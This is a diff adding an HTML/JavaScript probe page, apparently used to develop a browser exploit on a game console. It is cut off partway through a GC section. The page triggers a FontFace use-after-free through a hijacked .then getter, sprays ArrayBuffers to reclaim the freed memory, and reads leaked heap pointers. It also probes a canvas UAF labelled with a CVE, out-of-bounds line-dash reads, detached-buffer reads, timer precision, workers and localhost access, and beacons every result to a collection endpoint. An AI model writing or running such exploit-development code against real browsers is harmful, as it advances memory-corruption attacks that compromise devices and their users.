@@ -1,0 +1,951 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>P1095</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8ffc8;font:11px/1.5 monospace;padding:8px;overflow-y:auto}
+.hud{border:1px solid #1a3a1a;border-radius:4px;margin-bottom:6px;padding:6px;background:#0d1117}
+.title{color:#00ff88;font-size:13px;font-weight:bold;margin-bottom:4px}
+.sub{color:#66aaff;font-size:11px}
+.ok{color:#00ff88}.fail{color:#ff4444}.warn{color:#ffaa00}.info{color:#66aaff}.crit{color:#ff00ff;font-weight:bold}
+#progress{position:fixed;top:0;left:0;height:3px;background:#00ff88;transition:width 0.3s;z-index:999}
+</style>
+</head>
+<body>
+<div id="progress" style="width:0%"></div>
+<div class="hud">
+<div class="title">P1095 — MEGA BROWSER COMPARISON PROBE</div>
+<div class="sub">Run 5x on Game Browser, then 5x on User Guide Browser. Compare results.</div>
+<div class="sub">15 sections, ranked by breakthrough potential. ~30s runtime.</div>
+</div>
+<div id="log"></div>
+<div id="arena" style="position:absolute;left:-9999px;width:500px"></div>
+
+<script>
+var L=document.getElementById('log'),arena=document.getElementById('arena'),PB=document.getElementById('progress');
+var RUN_ID=Math.random().toString(36).substring(2,8);
+var TOTAL_SECTIONS=15,doneCount=0;
+
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight}
+function B(t,d){try{new Image().src='/beacon.php?tag=P1095-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d).substring(0,900))+'&r='+RUN_ID+'&_='+Date.now()}catch(e){}}
+function sl(ms){return new Promise(function(r){setTimeout(r,ms)})}
+function prog(){doneCount++;PB.style.width=Math.round(doneCount/TOTAL_SECTIONS*100)+'%'}
+
+// Float64 <-> BigUint64 helpers
+var _f64=new Float64Array(1),_u64;
+try{_u64=new BigUint64Array(_f64.buffer)}catch(e){_u64=null}
+function f2u(f){if(!_u64)return null;_f64[0]=f;return _u64[0]}
+function u2f(u){if(!_u64)return NaN;_u64[0]=u;return _f64[0]}
+function hexQ(bi){if(typeof bi!=='bigint')return'??';var s=bi.toString(16);while(s.length<16)s='0'+s;return'0x'+s}
+
+// ================================================================
+// SECTION 1: FEATURE DETECTION (baseline for comparison)
+// ================================================================
+async function S1(){
+  log('warn','=== S1: FEATURE DETECTION ===');
+  var feat={};
+  feat.BigUint64Array=typeof BigUint64Array!=='undefined';
+  feat.BigInt=typeof BigInt!=='undefined';
+  feat.WeakRef=typeof WeakRef!=='undefined';
+  feat.FinalizationRegistry=typeof FinalizationRegistry!=='undefined';
+  feat.structuredClone=typeof structuredClone!=='undefined';
+  feat.WebAssembly=typeof WebAssembly!=='undefined';
+  feat.SharedArrayBuffer=typeof SharedArrayBuffer!=='undefined';
+  feat.Proxy=typeof Proxy!=='undefined';
+  feat.Symbol=typeof Symbol!=='undefined';
+  feat.Reflect=typeof Reflect!=='undefined';
+  feat.Atomics=typeof Atomics!=='undefined';
+  feat.AbortController=typeof AbortController!=='undefined';
+  feat.queueMicrotask=typeof queueMicrotask!=='undefined';
+  feat.globalThis=typeof globalThis!=='undefined';
+  feat.ArrayBuffer_transfer=typeof ArrayBuffer.prototype.transfer==='function';
+  feat.Worker=typeof Worker!=='undefined';
+  feat.ServiceWorker='serviceWorker' in navigator;
+  feat.WebSocket=typeof WebSocket!=='undefined';
+  feat.IntersectionObserver=typeof IntersectionObserver!=='undefined';
+  feat.ResizeObserver=typeof ResizeObserver!=='undefined';
+  feat.MutationObserver=typeof MutationObserver!=='undefined';
+  feat.FontFace=typeof FontFace!=='undefined';
+  feat.OffscreenCanvas=typeof OffscreenCanvas!=='undefined';
+  feat.createImageBitmap=typeof createImageBitmap!=='undefined';
+  feat.CSS_supports=typeof CSS!=='undefined'&&typeof CSS.supports==='function';
+  feat.Intl_Segmenter=typeof Intl!=='undefined'&&typeof Intl.Segmenter!=='undefined';
+  feat.DataView_getBigUint64=typeof DataView.prototype.getBigUint64==='function';
+  feat.performance_now=typeof performance!=='undefined'&&typeof performance.now==='function';
+
+  var keys=Object.keys(feat);
+  var yes=[],no=[];
+  for(var i=0;i<keys.length;i++){
+    (feat[keys[i]]?yes:no).push(keys[i]);
+  }
+  B('S1-FEATURES','YES:'+yes.join(',')+' | NO:'+no.join(','));
+  log('ok','[S1] YES('+yes.length+'): '+yes.join(', '));
+  log('fail','[S1] NO('+no.length+'): '+no.join(', '));
+  prog();
+  return feat;
+}
+
+// ================================================================
+// SECTION 2: FONTFACE UAF — .then GETTER TRIGGER [BREAKTHROUGH: HIGH]
+// The #1 question: does fonts.load() call our .then getter?
+// p563 says YES in User Guide, P1094 says NO in game browser
+// ================================================================
+async function S2(){
+  log('warn','=== S2: FONTFACE UAF .then GETTER [CRITICAL] ===');
+  var result={triggered:false,method:'none',attempts:0};
+
+  // Method A: fonts.load() with programmatic FontFace + style element (p563 exact)
+  for(var a=0;a<3;a++){
+    try{
+      var firedA=false;
+      var ff=new FontFace('s2a'+a,'local(Arial)',{unicodeRange:'U+0041'});
+      document.fonts.add(ff);
+      void ff.loaded;
+
+      var sty=document.createElement('style');
+      sty.textContent='@font-face{font-family:s2s'+a+';src:local(Arial);unicode-range:U+0042}';
+      document.head.appendChild(sty);
+
+      var origThen=Object.getOwnPropertyDescriptor(FontFace.prototype,'then');
+      Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+        if(firedA)return undefined;
+        firedA=true;
+        return undefined;
+      },set:function(){}});
+
+      try{document.fonts.load('1em s2a'+a+', s2s'+a,'AB')}catch(e){}
+      await sl(200);
+
+      if(origThen)Object.defineProperty(FontFace.prototype,'then',origThen);
+      else delete FontFace.prototype.then;
+      try{document.fonts.delete(ff)}catch(e){}
+      try{sty.remove()}catch(e){}
+
+      result.attempts++;
+      if(firedA){result.triggered=true;result.method='fontsLoad';break}
+    }catch(e){B('S2-ERR-A','attempt:'+a+'|'+e.message)}
+  }
+
+  // Method B: individual face.load() on FontFace object
+  if(!result.triggered){
+    for(var b=0;b<3;b++){
+      try{
+        var firedB=false;
+        var ff2=new FontFace('s2b'+b,'local(Arial)');
+        document.fonts.add(ff2);
+
+        var origThen2=Object.getOwnPropertyDescriptor(FontFace.prototype,'then');
+        Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+          if(firedB)return undefined;
+          firedB=true;
+          return undefined;
+        },set:function(){}});
+
+        try{ff2.load()}catch(e){}
+        await sl(200);
+
+        if(origThen2)Object.defineProperty(FontFace.prototype,'then',origThen2);
+        else delete FontFace.prototype.then;
+        try{document.fonts.delete(ff2)}catch(e){}
+
+        result.attempts++;
+        if(firedB){result.triggered=true;result.method='faceLoad';break}
+      }catch(e){B('S2-ERR-B','attempt:'+b+'|'+e.message)}
+    }
+  }
+
+  // Method C: Promise.resolve(fontface) — direct thenable check
+  if(!result.triggered){
+    try{
+      var firedC=false;
+      var ff3=new FontFace('s2c','local(Arial)');
+      Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+        if(firedC)return undefined;
+        firedC=true;
+        return undefined;
+      },set:function(){}});
+
+      Promise.resolve(ff3);
+      await sl(100);
+
+      delete FontFace.prototype.then;
+      result.attempts++;
+      if(firedC){result.triggered=true;result.method='PromiseResolve'}
+    }catch(e){B('S2-ERR-C',e.message)}
+  }
+
+  // Method D: face.loaded promise .then — does loaded's value have .then?
+  if(!result.triggered){
+    try{
+      var firedD=false;
+      var ff4=new FontFace('s2d','local(Arial)');
+      document.fonts.add(ff4);
+
+      Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+        if(firedD)return undefined;
+        firedD=true;
+        return undefined;
+      },set:function(){}});
+
+      var loadedP=ff4.loaded;
+      await Promise.race([loadedP,sl(500)]);
+      await sl(100);
+
+      delete FontFace.prototype.then;
+      try{document.fonts.delete(ff4)}catch(e){}
+      result.attempts++;
+      if(firedD){result.triggered=true;result.method='faceLoaded'}
+    }catch(e){B('S2-ERR-D',e.message)}
+  }
+
+  B('S2-RESULT','triggered:'+result.triggered+'|method:'+result.method+'|attempts:'+result.attempts);
+  log(result.triggered?'crit':'fail','[S2] FontFace .then: '+(result.triggered?'FIRED via '+result.method:'DEAD ('+result.attempts+' attempts)'));
+  prog();
+  return result;
+}
+
+// ================================================================
+// SECTION 3: FONTFACE HEAP RECLAIM + POINTER READ [BREAKTHROUGH: HIGH]
+// If S2 fires, can we reclaim the freed CSSFontFace with ArrayBuffer
+// and read engine-written heap pointers via BigUint64Array?
+// ================================================================
+async function S3(s2result){
+  log('warn','=== S3: FONTFACE HEAP RECLAIM [CRITICAL] ===');
+  if(!s2result.triggered){
+    B('S3-SKIP','no-trigger');
+    log('info','[S3] SKIPPED — S2 trigger not available');
+    prog();
+    return null;
+  }
+
+  var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024];
+  var K=8;
+  var hits=[];
+
+  for(var attempt=0;attempt<3;attempt++){
+    try{
+      var styleEl=document.createElement('style');
+      var fam='s3r'+attempt+Date.now();
+      styleEl.textContent='@font-face{font-family:'+fam+';src:local(Arial);unicode-range:U+0042}';
+      document.head.appendChild(styleEl);
+      var progFace=new FontFace('s3p'+attempt,'local(Arial)',{unicodeRange:'U+0041'});
+      document.fonts.add(progFace);
+
+      var firedHere=false;
+      var reclaimMap=[];
+      var origThen=Object.getOwnPropertyDescriptor(FontFace.prototype,'then');
+
+      Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+        if(firedHere)return undefined;
+        firedHere=true;
+        if(styleEl){styleEl.remove();styleEl.textContent='';styleEl=null}
+        try{document.fonts.delete(this)}catch(e){}
+        document.body.offsetHeight;
+        for(var si=0;si<SIZES.length;si++){
+          for(var k=0;k<K;k++){
+            var ab=new ArrayBuffer(SIZES[si]);
+            reclaimMap.push({size:SIZES[si],buf:ab});
+          }
+        }
+        try{document.fonts.check('1em '+fam)}catch(e){}
+        return undefined;
+      },set:function(){}});
+
+      try{document.fonts.load('1em s3p'+attempt+', '+fam,'AB')}catch(e){}
+      await sl(150);
+
+      if(origThen)Object.defineProperty(FontFace.prototype,'then',origThen);
+      else delete FontFace.prototype.then;
+      try{document.fonts.delete(progFace)}catch(e){}
+
+      if(!firedHere)continue;
+
+      // Scan for non-zero buffers
+      for(var i=0;i<reclaimMap.length;i++){
+        var view=new Uint8Array(reclaimMap[i].buf);
+        var nz=0;
+        for(var j=0;j<view.length;j++)if(view[j]!==0)nz++;
+        if(nz>0&&typeof BigUint64Array!=='undefined'){
+          var bv=new BigUint64Array(reclaimMap[i].buf);
+          var ptr58=bv[11]||0n; // +0x58
+          var ptr68=bv[13]||0n; // +0x68
+          hits.push({size:reclaimMap[i].size,nz:nz,ptr58:ptr58,ptr68:ptr68,idx:i});
+          B('S3-HIT','attempt:'+attempt+'|sz:'+reclaimMap[i].size+'|nz:'+nz+'|p58:'+hexQ(ptr58)+'|p68:'+hexQ(ptr68));
+          log('crit','[S3] HIT sz='+reclaimMap[i].size+' nz='+nz+' +0x58='+hexQ(ptr58)+' +0x68='+hexQ(ptr68));
+          break;
+        }
+      }
+      if(hits.length>0)break;
+    }catch(e){B('S3-ERR','attempt:'+attempt+'|'+e.message)}
+  }
+
+  if(hits.length===0){
+    B('S3-MISS','0-hits');
+    log('fail','[S3] No reclaim hit');
+  }
+  B('S3-RESULT','hits:'+hits.length);
+  prog();
+  return hits.length>0?hits[0]:null;
+}
+
+// ================================================================
+// SECTION 4: CANVAS UAF ALIAS [BREAKTHROUGH: HIGH]
+// CVE-2026-43720 desynchronized getter re-entrancy
+// Two JS wrappers → same live C++ CanvasRenderingContext2D
+// ================================================================
+async function S4(){
+  log('warn','=== S4: CANVAS UAF ALIAS (CVE-2026-43720) [CRITICAL] ===');
+
+  // Phase 1: Safe feature detection — does desynchronized option exist?
+  var hasDesync=false;
+  try{
+    var tc=document.createElement('canvas');tc.width=1;tc.height=1;
+    var tctx=tc.getContext('2d',{desynchronized:false});
+    hasDesync=!!tctx;
+    B('S4-DESYNC-CHECK','hasCtx:'+hasDesync);
+  }catch(e){B('S4-DESYNC-ERR',e.message)}
+
+  // Phase 2: SKIPPED — getContext with desynchronized getter re-entrancy
+  // itself crashes WebProcess (hard UAF in C++ canvas context creation).
+  // v1: crashes during property access. v2: crashes during getContext call.
+  // Even try/catch cannot prevent it. Known from 30+ crash runs.
+  B('S4-SKIPPED','desync-getter-crashes-webprocess|desync-available:'+hasDesync);
+  log('warn','[S4] Canvas UAF: SKIPPED (getContext getter re-entrancy crashes WebProcess)');
+  prog();
+  return null;
+}
+
+// ================================================================
+// SECTION 5: FLOAT64 POINTER PRESERVATION [BREAKTHROUGH: MEDIUM]
+// Can heap pointer bit patterns survive float64 round-trip?
+// DAZ (Denormals-Are-Zero) flushes small exponents to 0
+// ================================================================
+async function S5(ctx){
+  log('warn','=== S5: FLOAT64 POINTER ROUND-TRIP ===');
+  // Create standalone canvas if no alias context
+  if(!ctx){
+    try{
+      var sc=document.createElement('canvas');sc.width=10;sc.height=10;
+      var sctx=sc.getContext('2d');
+      if(sctx)ctx={stale:sctx,spray:sctx,canvas:sc};
+    }catch(e){}
+  }
+  if(!ctx){B('S5-SKIP','no-ctx');prog();return}
+
+  var testPtrs=[
+    {name:'heap-low',  val:0x0000001000000000n},
+    {name:'heap-mid',  val:0x00000010008d8920n},
+    {name:'heap-high', val:0x000000100FFFFFFFn},
+    {name:'eboot-ish', val:0x0000005320000000n},
+    {name:'kptr-fake', val:0xFFFF800000000000n},
+    {name:'small-int', val:0x0000000000000001n},
+    {name:'big-int',   val:0x7FFFFFFFFFFFFFFFn},
+    {name:'nan-box',   val:0xFFF8000000000000n},
+    {name:'subnormal', val:0x0000000000000001n},
+    {name:'max-sub',   val:0x000FFFFFFFFFFFFFn}
+  ];
+
+  var results=[];
+
+  for(var i=0;i<testPtrs.length;i++){
+    var tp=testPtrs[i];
+    if(!_u64){results.push(tp.name+':NO-BIG');continue}
+
+    // Test via lineDash
+    var asFloat=u2f(tp.val);
+    ctx.stale.setLineDash([asFloat]);
+    var readDash=ctx.spray.getLineDash();
+    var dashBits=(readDash.length>0)?f2u(readDash[0]):null;
+    var dashOk=dashBits!==null&&dashBits===tp.val;
+
+    // Test via transform
+    ctx.stale.setTransform(asFloat,0,0,1,0,0);
+    var readTx=ctx.spray.getTransform();
+    var txBits=f2u(readTx.a);
+    var txOk=txBits===tp.val;
+
+    // Test via shadowOffsetX
+    ctx.stale.shadowOffsetX=asFloat;
+    var readShadow=ctx.spray.shadowOffsetX;
+    var shadowBits=f2u(readShadow);
+    var shadowOk=shadowBits===tp.val;
+
+    var status=dashOk&&txOk&&shadowOk?'ALL-OK':
+               (!dashOk&&!txOk&&!shadowOk?'ALL-FAIL':'PARTIAL');
+    results.push(tp.name+':'+status);
+
+    if(status!=='ALL-OK'){
+      B('S5-DAZ',tp.name+'|wrote:'+hexQ(tp.val)+'|dash:'+hexQ(dashBits||0n)+'|tx:'+hexQ(txBits)+'|shadow:'+hexQ(shadowBits));
+    }
+  }
+
+  B('S5-RESULT',results.join('|'));
+  var allOk=results.filter(function(r){return r.indexOf('ALL-OK')>=0}).length;
+  var failed=results.filter(function(r){return r.indexOf('FAIL')>=0}).length;
+  log(failed>0?'warn':'ok','[S5] Pointer round-trip: '+allOk+'/'+results.length+' OK, '+failed+' ALL-FAIL');
+  log('info','[S5] '+results.join(', '));
+
+  // Reset
+  ctx.stale.setLineDash([]);
+  ctx.stale.setTransform(1,0,0,1,0,0);
+  ctx.stale.shadowOffsetX=0;
+  prog();
+}
+
+// ================================================================
+// SECTION 6: LINEDASH OOB READ CHECK [BREAKTHROUGH: HIGH]
+// Write N values via setLineDash, read back — length mismatch = OOB!
+// ================================================================
+async function S6(ctx){
+  log('warn','=== S6: LINEDASH OOB READ CHECK ===');
+  if(!ctx){
+    try{
+      var sc=document.createElement('canvas');sc.width=10;sc.height=10;
+      var sctx=sc.getContext('2d');
+      if(sctx)ctx={stale:sctx,spray:sctx,canvas:sc};
+    }catch(e){}
+  }
+  if(!ctx){B('S6-SKIP','no-ctx');prog();return}
+
+  var sizes=[2,4,8,16,32,64,128,256,512,1024];
+  var oob=false;
+
+  for(var si=0;si<sizes.length;si++){
+    var sz=sizes[si];
+    var pattern=[];
+    for(var i=0;i<sz;i++)pattern.push(i+0.5);
+    ctx.stale.setLineDash(pattern);
+    var rb=ctx.spray.getLineDash();
+
+    if(rb.length!==sz){
+      oob=true;
+      B('S6-OOB','wrote:'+sz+'|got:'+rb.length);
+      log('crit','[S6] OOB! Wrote '+sz+' read '+rb.length);
+
+      // Dump extra values
+      if(rb.length>sz&&_u64){
+        var extras=[];
+        for(var i=sz;i<Math.min(rb.length,sz+16);i++){
+          extras.push(hexQ(f2u(rb[i])));
+        }
+        B('S6-OOB-VALS',extras.join(','));
+      }
+    }
+  }
+
+  if(!oob){
+    B('S6-CLEAN','all-match');
+    log('ok','[S6] No OOB — all lengths match ('+sizes.join(',')+')');
+  }
+
+  ctx.stale.setLineDash([]);
+  prog();
+}
+
+// ================================================================
+// SECTION 7: CANVAS CONTEXT TYPE CONFUSION [BREAKTHROUGH: MEDIUM]
+// Triple-context bug: 2d + webgl + 2d on same canvas
+// ================================================================
+async function S7(){
+  log('warn','=== S7: CANVAS CONTEXT TYPE CONFUSION ===');
+
+  try{
+    var c=document.createElement('canvas');c.width=100;c.height=100;
+    arena.appendChild(c);
+
+    var ctx2d=c.getContext('2d');
+    var hasWebGL=false;
+    var ctxGL=null;
+    try{ctxGL=c.getContext('webgl');hasWebGL=!!ctxGL}catch(e){}
+    try{if(!ctxGL)ctxGL=c.getContext('experimental-webgl');hasWebGL=!!ctxGL}catch(e){}
+
+    // Try getting 2d again after webgl request
+    var ctx2d_2=c.getContext('2d');
+    var sameCtx=(ctx2d===ctx2d_2);
+
+    B('S7-RESULT','webgl:'+hasWebGL+'|same2d:'+sameCtx);
+    log(hasWebGL?'crit':'info','[S7] WebGL: '+(hasWebGL?'YES':'NO')+' | 2d re-get same: '+sameCtx);
+
+    // Try bitmaprenderer
+    var hasBitmap=false;
+    try{
+      var c2=document.createElement('canvas');c2.width=10;c2.height=10;
+      var bctx=c2.getContext('bitmaprenderer');
+      hasBitmap=!!bctx;
+      B('S7-BITMAP','available:'+hasBitmap);
+    }catch(e){}
+    log('info','[S7] bitmaprenderer: '+hasBitmap);
+  }catch(e){
+    B('S7-ERR',e.message);
+  }
+  prog();
+}
+
+// ================================================================
+// SECTION 8: ERROR STACK / NATIVE ADDRESS LEAK [BREAKTHROUGH: LOW]
+// Some engines expose native addresses in Error.stack
+// ================================================================
+async function S8(){
+  log('warn','=== S8: ERROR STACK ANALYSIS ===');
+
+  var stacks=[];
+  try{null.x}catch(e){stacks.push({type:'TypeError',stack:e.stack||'',msg:e.message})}
+  try{(void 0)()}catch(e){stacks.push({type:'TypeError2',stack:e.stack||'',msg:e.message})}
+  try{eval('{')}catch(e){stacks.push({type:'SyntaxError',stack:e.stack||'',msg:e.message})}
+  try{new Uint8Array(-1)}catch(e){stacks.push({type:'RangeError',stack:e.stack||'',msg:e.message})}
+  try{decodeURIComponent('%')}catch(e){stacks.push({type:'URIError',stack:e.stack||'',msg:e.message})}
+
+  // Deep stack for more frames
+  function deep(n){if(n<=0)throw new Error('deep');return deep(n-1)}
+  try{deep(20)}catch(e){stacks.push({type:'DeepStack',stack:e.stack||'',msg:e.message})}
+
+  var hasAddr=false;
+  for(var i=0;i<stacks.length;i++){
+    var s=stacks[i];
+    // Look for hex addresses in stack (0x followed by 8+ hex chars)
+    var addrMatch=s.stack.match(/0x[0-9a-fA-F]{8,}/g);
+    if(addrMatch&&addrMatch.length>0){
+      hasAddr=true;
+      B('S8-ADDR',s.type+'|addrs:'+addrMatch.join(','));
+      log('crit','[S8] ADDRESSES in '+s.type+': '+addrMatch.join(', '));
+    }
+    B('S8-STACK',s.type+'|'+s.stack.substring(0,200).replace(/\n/g,'\\n'));
+  }
+
+  if(!hasAddr)log('info','[S8] No native addresses in error stacks');
+  B('S8-RESULT','hasAddr:'+hasAddr+'|types:'+stacks.length);
+  prog();
+}
+
+// ================================================================
+// SECTION 9: STRUCTUREDCLONE UAF / TRANSFER [BREAKTHROUGH: MEDIUM]
+// Can structuredClone leave dangling references?
+// ================================================================
+async function S9(){
+  log('warn','=== S9: STRUCTUREDCLONE TRANSFER ===');
+
+  if(typeof structuredClone==='undefined'){
+    B('S9-ABSENT','no-structuredClone');
+    log('fail','[S9] structuredClone not available');
+    prog();return;
+  }
+
+  // Test 1: Transfer detaches original
+  try{
+    var ab=new ArrayBuffer(256);
+    var view=new Uint8Array(ab);
+    view[0]=0xAA;view[1]=0xBB;
+    var cloned=structuredClone(ab,{transfer:[ab]});
+    var detached=(ab.byteLength===0);
+    var cloneView=new Uint8Array(cloned);
+    var dataOk=(cloneView[0]===0xAA&&cloneView[1]===0xBB);
+    B('S9-TRANSFER','detached:'+detached+'|dataOk:'+dataOk+'|cloneSz:'+cloned.byteLength);
+    log(detached?'ok':'crit','[S9] Transfer: detached='+detached+' data='+dataOk);
+  }catch(e){B('S9-TRANSFER-ERR',e.message)}
+
+  // Test 2: Double transfer (should throw)
+  try{
+    var ab2=new ArrayBuffer(128);
+    structuredClone(ab2,{transfer:[ab2,ab2]});
+    B('S9-DOUBLE','DID-NOT-THROW');
+    log('crit','[S9] Double transfer DID NOT THROW!');
+  }catch(e){
+    B('S9-DOUBLE','threw:'+e.name);
+    log('ok','[S9] Double transfer threw: '+e.name);
+  }
+
+  // Test 3: Same-object ref (a===b)
+  try{
+    var shared={x:42};
+    var obj={a:shared,b:shared};
+    var c=structuredClone(obj);
+    var sameRef=(c.a===c.b);
+    B('S9-SAMEREF','preserved:'+sameRef);
+    log('info','[S9] Same-ref: '+(sameRef?'preserved (dedup)':'broken'));
+  }catch(e){B('S9-SAMEREF-ERR',e.message)}
+
+  // Test 4: Transfer then access (UAF pattern)
+  try{
+    var ab3=new ArrayBuffer(64);
+    var v3=new Uint8Array(ab3);
+    v3.fill(0xCC);
+    structuredClone(ab3,{transfer:[ab3]});
+    // ab3 should be detached — try to read
+    try{
+      var v4=new Uint8Array(ab3);
+      B('S9-UAF','no-throw|len:'+v4.length+'|byte0:'+v4[0]);
+      log('crit','[S9] DETACHED READ: no throw! len='+v4.length);
+    }catch(e2){
+      B('S9-UAF','threw:'+e2.name);
+      log('ok','[S9] Detached read threw: '+e2.name);
+    }
+  }catch(e){B('S9-UAF-ERR',e.message)}
+
+  B('S9-DONE','complete');
+  prog();
+}
+
+// ================================================================
+// SECTION 10: PROXY TRAP ON NATIVE OBJECTS [BREAKTHROUGH: LOW-MED]
+// Proxy handler can intercept property access on native wrappers
+// ================================================================
+async function S10(ctx){
+  log('warn','=== S10: PROXY TRAPS ON NATIVE OBJECTS ===');
+
+  if(typeof Proxy==='undefined'){
+    B('S10-ABSENT','no-Proxy');prog();return;
+  }
+
+  // Test on FontFace
+  try{
+    var ff=new FontFace('s10','local(Arial)');
+    var ffTraps=[];
+    var ffP=new Proxy(ff,{
+      get:function(t,p){ffTraps.push('get:'+String(p));return Reflect.get(t,p)},
+      set:function(t,p,v){ffTraps.push('set:'+String(p));return Reflect.set(t,p,v)}
+    });
+    try{var s=ffP.status}catch(e){}
+    try{var f=ffP.family}catch(e){}
+    try{ffP.display='swap'}catch(e){}
+    try{String(ffP)}catch(e){}
+    B('S10-FF','traps:'+ffTraps.length+'|ops:'+ffTraps.join(','));
+  }catch(e){B('S10-FF-ERR',e.message)}
+
+  // Test on document.fonts
+  try{
+    var fsTraps=[];
+    var fsP=new Proxy(document.fonts,{
+      get:function(t,p){fsTraps.push('get:'+String(p));return Reflect.get(t,p)}
+    });
+    try{fsP.size}catch(e){}
+    try{fsP.status}catch(e){}
+    try{fsP.ready}catch(e){}
+    B('S10-FS','traps:'+fsTraps.length+'|ops:'+fsTraps.join(','));
+  }catch(e){B('S10-FS-ERR',e.message)}
+
+  // Test on canvas context
+  if(ctx){
+    try{
+      var cTraps=[];
+      var cP=new Proxy(ctx.stale,{
+        get:function(t,p){cTraps.push(String(p));return Reflect.get(t,p)}
+      });
+      try{cP.lineWidth}catch(e){}
+      try{cP.getTransform()}catch(e){}
+      try{cP.canvas}catch(e){}
+      B('S10-CTX','traps:'+cTraps.length+'|ops:'+cTraps.slice(0,15).join(','));
+    }catch(e){B('S10-CTX-ERR',e.message)}
+  }
+
+  log('info','[S10] Proxy traps captured');
+  prog();
+}
+
+// ================================================================
+// SECTION 11: PERFORMANCE.NOW() PRECISION [BREAKTHROUGH: LOW]
+// ================================================================
+async function S11(){
+  log('warn','=== S11: TIMING PRECISION ===');
+
+  try{
+    var samples=[];
+    for(var i=0;i<100;i++)samples.push(performance.now());
+    var diffs=[];
+    for(var i=1;i<samples.length;i++){
+      var d=samples[i]-samples[i-1];
+      if(d>0)diffs.push(d);
+    }
+    diffs.sort(function(a,b){return a-b});
+    var minD=diffs.length>0?diffs[0]:0;
+    var medD=diffs.length>0?diffs[Math.floor(diffs.length/2)]:0;
+    var maxD=diffs.length>0?diffs[diffs.length-1]:0;
+    var clamped=(minD>=0.99); // 1ms clamping
+
+    B('S11-PERF','min:'+minD.toFixed(4)+'|med:'+medD.toFixed(4)+'|max:'+maxD.toFixed(4)+'|clamped:'+clamped+'|nonzero:'+diffs.length);
+    log(clamped?'warn':'ok','[S11] performance.now(): min='+minD.toFixed(4)+'ms med='+medD.toFixed(4)+'ms clamped='+clamped);
+
+    // Date.now() precision
+    var dSamples=[];
+    for(var i=0;i<50;i++)dSamples.push(Date.now());
+    var dDiffs=[];
+    for(var i=1;i<dSamples.length;i++){
+      var dd=dSamples[i]-dSamples[i-1];
+      if(dd>0)dDiffs.push(dd);
+    }
+    var dMin=dDiffs.length>0?dDiffs[0]:0;
+    B('S11-DATE','min:'+dMin+'ms|nonzero:'+dDiffs.length);
+  }catch(e){B('S11-ERR',e.message)}
+  prog();
+}
+
+// ================================================================
+// SECTION 12: WORKER / SERVICEWORKER [BREAKTHROUGH: MEDIUM]
+// Parallel execution could enable race conditions
+// ================================================================
+async function S12(){
+  log('warn','=== S12: WORKER THREADS ===');
+
+  // Dedicated Worker
+  try{
+    var blob=new Blob(['postMessage({pid:"w",ts:Date.now()})'],{type:'application/javascript'});
+    var url=URL.createObjectURL(blob);
+    var w=new Worker(url);
+    var workerResult=await new Promise(function(resolve){
+      w.onmessage=function(e){resolve(e.data)};
+      w.onerror=function(e){resolve({err:e.message||'error'})};
+      setTimeout(function(){resolve({err:'timeout'})},2000);
+    });
+    w.terminate();URL.revokeObjectURL(url);
+    B('S12-WORKER','result:'+JSON.stringify(workerResult));
+    log(workerResult.pid?'crit':'fail','[S12] Worker: '+(workerResult.pid?'WORKS':'FAILED: '+workerResult.err));
+  }catch(e){
+    B('S12-WORKER-ERR',e.message);
+    log('fail','[S12] Worker: '+e.message);
+  }
+
+  // ServiceWorker
+  try{
+    if('serviceWorker' in navigator){
+      var swReg=await Promise.race([
+        navigator.serviceWorker.register('/sw-test.js').then(function(r){return{ok:true,scope:r.scope}}),
+        sl(3000).then(function(){return{err:'timeout'}})
+      ]);
+      B('S12-SW','result:'+JSON.stringify(swReg));
+      log(swReg.ok?'crit':'info','[S12] ServiceWorker: '+(swReg.ok?'REGISTERED scope='+swReg.scope:'FAILED: '+swReg.err));
+    }else{
+      B('S12-SW','absent');
+      log('info','[S12] ServiceWorker: not in navigator');
+    }
+  }catch(e){
+    B('S12-SW-ERR',e.message);
+    log('info','[S12] ServiceWorker: '+e.message);
+  }
+
+  // SharedWorker
+  try{
+    var sw=new SharedWorker('data:application/javascript,');
+    B('S12-SHARED','created');
+    log('info','[S12] SharedWorker: created');
+  }catch(e){
+    B('S12-SHARED-ERR',e.message);
+    log('info','[S12] SharedWorker: '+e.message);
+  }
+
+  prog();
+}
+
+// ================================================================
+// SECTION 13: NETWORK CAPABILITIES [BREAKTHROUGH: LOW]
+// WebSocket, fetch to localhost, XHR to internal addresses
+// ================================================================
+async function S13(){
+  log('warn','=== S13: NETWORK CAPABILITIES ===');
+
+  // WebSocket
+  try{
+    var ws=new WebSocket('ws://localhost:9026');
+    var wsResult=await new Promise(function(resolve){
+      ws.onopen=function(){resolve('open')};
+      ws.onerror=function(){resolve('error')};
+      ws.onclose=function(){resolve('close')};
+      setTimeout(function(){resolve('timeout')},3000);
+    });
+    try{ws.close()}catch(e){}
+    B('S13-WS','localhost:9026|result:'+wsResult);
+    log(wsResult==='open'?'crit':'info','[S13] WebSocket localhost:9026: '+wsResult);
+  }catch(e){
+    B('S13-WS-ERR',e.message);
+  }
+
+  // Fetch to localhost
+  try{
+    var resp=await Promise.race([
+      fetch('http://localhost/').then(function(r){return{status:r.status,ok:r.ok}}),
+      sl(3000).then(function(){return{err:'timeout'}})
+    ]);
+    B('S13-FETCH','localhost|result:'+JSON.stringify(resp));
+  }catch(e){
+    B('S13-FETCH-ERR',e.message);
+  }
+
+  // XHR to current origin
+  try{
+    var xhr=new XMLHttpRequest();
+    xhr.open('GET','/beacon.php?tag=P1095-S13-XHR&data=test',false);
+    xhr.send();
+    B('S13-XHR','status:'+xhr.status);
+  }catch(e){
+    B('S13-XHR-ERR',e.message);
+  }
+
+  log('info','[S13] Network tests complete');
+  prog();
+}
+
+// ================================================================
+// SECTION 14: MEMORY / GC BEHAVIOR [BREAKTHROUGH: LOW]
+// How does GC behave? Can we force collection? mlock equivalent?
+// ================================================================
+async function S14(){
+  log('warn','=== S14: GC + MEMORY BEHAVIOR ===');
+
+  // GC pressure test — allocate and discard, measure timing
